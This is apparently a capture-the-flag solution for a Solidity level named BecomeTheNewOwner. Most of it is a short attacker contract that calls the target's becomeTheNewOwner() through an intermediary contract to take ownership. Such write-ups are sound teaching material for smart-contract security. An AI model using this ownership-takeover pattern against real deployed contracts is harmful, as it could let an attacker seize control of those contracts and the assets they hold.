# BecomeTheNewOwner

## Solution :

To validate this challenge, the user needs to become the owner of the contract.

To do that, he needs to call the `becomeTheNewOwner()` function with a contract.

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/easyChalls/BecomeTheNewOwner.sol";

contract attackBecomeTheNewOwner {
    BecomeTheNewOwner originalContract;

    constructor(address _originalContract) public {
        originalContract = BecomeTheNewOwner(_originalContract);
    }

    function exploit() public {
        originalContract.becomeTheNewOwner();
    }
}
```
